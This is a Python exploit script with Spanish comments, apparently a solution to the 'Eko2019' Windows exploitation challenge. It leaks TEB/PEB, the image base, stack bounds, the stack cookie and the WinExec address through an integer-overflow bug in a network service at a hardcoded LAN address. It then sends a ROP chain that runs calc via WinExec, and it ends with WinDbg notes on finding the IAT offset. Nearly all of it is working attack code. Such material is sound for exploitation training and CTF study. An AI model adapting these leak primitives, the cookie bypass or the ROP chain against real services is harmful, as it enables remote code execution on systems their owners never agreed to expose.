import socket
import struct

IP = '192.168.18.203'
LPORTS = 54321

def connection():
    try:
        con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        con.connect((IP, LPORTS))
        return con
    except:
        print('Fail Connection to {}'.format(IP))

def headers():
    header = struct.pack('<q', 0x393130326F6B45)            # string: Eko2019
    header_size = struct.pack('<q', 0x10101010ffff0600)     # size 16 bytes / -0xffff0110 = 272 integer overflow
    return header + header_size

def leak_TEB_PEB():
    s = connection()

    payload = headers()
    payload += 'A' * 0x200
    payload += struct.pack('<q', 0x65)  # offset para desplazamiento de opcode rax, gs:[rcx] TEB
    payload += struct.pack('<q', 0x60)  # pisa argumento ptr size_printf con offset rcx=0x60 a PEB
    s.send(payload)
    return struct.unpack('<q', s.recv(8))[0]

def leak_STACK_BASE():
    s = connection()

    payload = headers()
    payload += 'A' * 0x200
    payload += struct.pack('<q', 0x65)  # offset para desplazamiento de opcode mov rax,qword ptr ds:[rcx]
    payload += struct.pack('<q', 0x8)  # argumento ptr size_printf con offset rcx=0x8 a Stack Base
    s.send(payload)
    return struct.unpack('<q', s.recv(8))[0]

def leak_STACK_LIMIT():
    s = connection()

    payload = headers()
    payload += 'A' * 0x200
    payload += struct.pack('<q', 0x65)  # offset para desplazamiento de opcode mov rax,qword ptr ds:[rcx]
    payload += struct.pack('<q', 0x10)  # argumento ptr size_printf con offset rcx=0x10 a Stack Limit
    s.send(payload)
    return struct.unpack('<q', s.recv(8))[0]

def leak_BASE_ADDRESS(mem_PEB):
    s = connection()

    payload = headers()
    payload += 'A' * 0x200
    payload += struct.pack('<q', 0x66)  # offset para desplazamiento de opcode mov rax,qword ptr ds:[rcx]
    payload += struct.pack('<q', mem_PEB + 0x10)  # argumento ptr size_printf con offset rcx=PEB+0x10 a ImageBaseAddress
    s.send(payload)
    return struct.unpack('<q', s.recv(8))[0]



def leak_STACK_STRING(stack_LIMIT):
    StackLimit = struct.pack('<Q', stack_LIMIT)
    i = 0
    while True:
        s = connection()

        payload = headers()
        payload += 'A' * 0x200
        payload += struct.pack('<q', 0x66)
        payload += StackLimit
        payload += 's1kr10s\x00' * 2
        s.send(payload)

        i = i + 1
        find_stack = struct.unpack('<q', s.recv(8))[0]
        if find_stack == 32422611252883827:     # string a buscar "s1kr10s"
            offset_stack = (i-1) * 0x8
            return offset_stack
        else:
            stack_LIMIT = stack_LIMIT + 0x8    # incrementa stack en 8 bytes por cada vuelta
            StackLimit = struct.pack('<Q', stack_LIMIT)
        s.close()

def leak_COOKIE_STACK(offset_COOKIE):
    s = connection()

    payload = headers()
    payload += 'A' * 0x200
    payload += struct.pack('<q', 0x66)  # offset para desplazamiento de opcode mov rax,qword ptr ds:[rcx]
    payload += struct.pack('<q', offset_COOKIE)
    s.send(payload)
    return struct.unpack('<q', s.recv(8))[0]

def leak_WINEXEC(offset_winexec):
    s = connection()

    payload = headers()
    payload += 'A' * 0x200
    payload += struct.pack('<q', 0x66)  # offset para desplazamiento de opcode mov rax,qword ptr ds:[rcx]
    payload += struct.pack('<q', offset_winexec)
    s.send(payload)
    return struct.unpack('<q', s.recv(8))[0]

def exploit(ImageBaseAddress, ptr_winexec, string, cookie, offset_COOKIE, opcion_exloit):
    s = connection()

    if opcion_exloit == '1':
        # escribe calc en una direccion de la seccion .data
        ropero = struct.pack('<q', ImageBaseAddress + 0x1991)   # pop rdi
        ropero += struct.pack('<q', ImageBaseAddress + 0xC440)  # .data section
        ropero += struct.pack('<q', ImageBaseAddress + 0x1167)  # pop rax
        ropero += 'calc\x00\x00\x00\x00'                        # string calc.exe en .data
        ropero += struct.pack('<q', ImageBaseAddress + 0x16F9)  # pop rbx / retn
        ropero += struct.pack('<q', ImageBaseAddress + 0x8789)  # add rsp, 10h / retn
        ropero += struct.pack('<q', ImageBaseAddress + 0x323C)  # mov [rdi], rax / call rbx
        ropero += struct.pack('<q', 0x4343434343434343)         # compensando offset de rsp+10h a lpCmdLine
    else:
        # toma el string calc de stack
        de_stack = struct.pack('<q', string)

    # set lpCmdLine de WinExec() en RCX
    if opcion_exloit == '1':
        # toma el string calc de .data
        ropero += struct.pack('<q', ImageBaseAddress + 0x16F9)  # pop rbx / retn
        ropero += struct.pack('<q', ImageBaseAddress + 0xC440)  # string calc.exe en .data para opcion 1
    else:
        # toma el string calc de stack
        ropero = struct.pack('<q', ImageBaseAddress + 0x16F9)   # pop rbx / retn
        ropero += de_stack                                      # string calc.exe en stack para opcion 2

    ropero += struct.pack('<q', ImageBaseAddress + 0x1167)  # pop rax / retn
    ropero += struct.pack('<q', ImageBaseAddress + 0x4A0D)  # pop r12; ret;
    ropero += struct.pack('<q', ImageBaseAddress + 0x284A)  # mov rcx, rbx / call rax

    # set uCmdShow "SW_SHOWNORMAL = 1" de WinExec() en RDX
    ropero += struct.pack('<q', ImageBaseAddress + 0x4a09)  # pop r15 / pop r13 / pop r12 / ret;
    ropero += struct.pack('<q', 0x0)
    ropero += struct.pack('<q', 0x1)
    ropero += struct.pack('<q', 0x0)
    ropero += struct.pack('<q', ImageBaseAddress + 0x1167)  # pop rax / ret
    ropero += struct.pack('<q', ImageBaseAddress + 0x16F9)  # pop rbx / ret
    ropero += struct.pack('<q', ImageBaseAddress + 0x63E4)  # mov rdx, r13 / mov rcx, rbx / call rax

    # ejecuta WinExec()
    ropero += struct.pack('<q', ImageBaseAddress + 0x1167)  # pop rax
    ropero += struct.pack('<q', ptr_winexec)
    ropero += struct.pack('<q', ImageBaseAddress + 0x2E30)  # call rax
    ropero += struct.pack('<q', ImageBaseAddress + 0x323F)  # call rbx

    paylemon = headers()
    paylemon += 'A' * 0x200
    paylemon += struct.pack('<q', 0x66)     # offset para desplazamiento de opcode mov rax,qword ptr ds:[rcx]
    paylemon += struct.pack('<q', offset_COOKIE)            # ptr para evitar bloqueo
    paylemon += 'calc\x00\x00\x00\x00'                      # string calc.exe en stack para opcion 2
    paylemon += struct.pack('<q', 0x0)                      # compensacion 8 bytes
    paylemon += struct.pack('<q', cookie)                   # para comparar cookie
    paylemon += struct.pack('<q', 0x4343434343434343) * 2   # compensacion 16 bytes
    paylemon += ropero
    s.send(paylemon)

if __name__ == '__main__':
    print('---Leak Initialization---')
    mem_PEB = leak_TEB_PEB()
    ImageBaseAddress = leak_BASE_ADDRESS(mem_PEB)
    stack_LIMIT = leak_STACK_LIMIT()
    print('   Base Address PEB: {}'.format(hex(mem_PEB)))
    print('   Image Base Address: {}'.format(hex(ImageBaseAddress)))
    print('   Stack Limit: {}'.format(hex(stack_LIMIT)))

    print('---Find String in Stack---')
    offset_STACK = leak_STACK_STRING(stack_LIMIT)
    string = stack_LIMIT + offset_STACK
    print('   Offset Stack: {}'.format(hex(offset_STACK)))
    print('   String in Stack: {}'.format(hex(string)))

    print('---Calculate offset Cookie Stack---')
    offset_COOKIE = stack_LIMIT + offset_STACK + 0x10
    cookie = leak_COOKIE_STACK(offset_COOKIE)
    print('   Offset Cookie: {}'.format(hex(offset_COOKIE)))
    print('   Cookie Value: {}'.format(hex(cookie)))

    print('---Calculate offset WinExec---')
    offset_winexec = ImageBaseAddress + 0x9010
    ptr_winexec = leak_WINEXEC(offset_winexec)
    print('   IAT Offset WinExec: {}'.format(hex(offset_winexec)))
    print('   WinExec: {}'.format(hex(ptr_winexec)))

    print('---Sending Exploit---')
    opcion_exloit = raw_input("Exploit opcion 1 (.data) / 2 (stack): ")
    exploit(ImageBaseAddress, ptr_winexec, string, cookie, offset_COOKIE, opcion_exloit)


'''
Registro RAX utilizado para leakear 8 bytes por cada vuelta en el ciclo

------------------------------------------------------------------------

(0x60) TEB GS:[0x60]
    (0x10) Linear address of Process Environment Block (PEB)
        ImageBaseAddress : Ptr64 Void

WINDBG>!teb
WINDBG>dt ntdll!_TEB
WINDBG>!peb
WINDBG>dt ntdll!_PEB

https://en.wikipedia.org/wiki/Win32_Thread_Information_Block

------------------------------------------------------------------------

WINDBG>!dh eko2019
----- new -----
000000013f480000 image base
9000 [     268] address [size] of Import Address Table Directory

WINDBG>dps 0x000000013f480000+0x9000 L50/4
00000001`3f489000  00000000`76e9bad0 kernel32!WriteProcessMemoryStub
00000001`3f489008  00000000`76e65cf0 kernel32!GetCurrentProcessStub
00000001`3f489010  00000000`76ee8d50 kernel32!WinExec <--------------------- AQUI
00000001`3f489018  00000000`76e71e10 kernel32!GetCommandLineAStub
00000001`3f489020  00000000`76e9bca0 kernel32!TerminateProcessStub

? 0x000000013f480000-0x000000013f489008 = 0x9010
'''
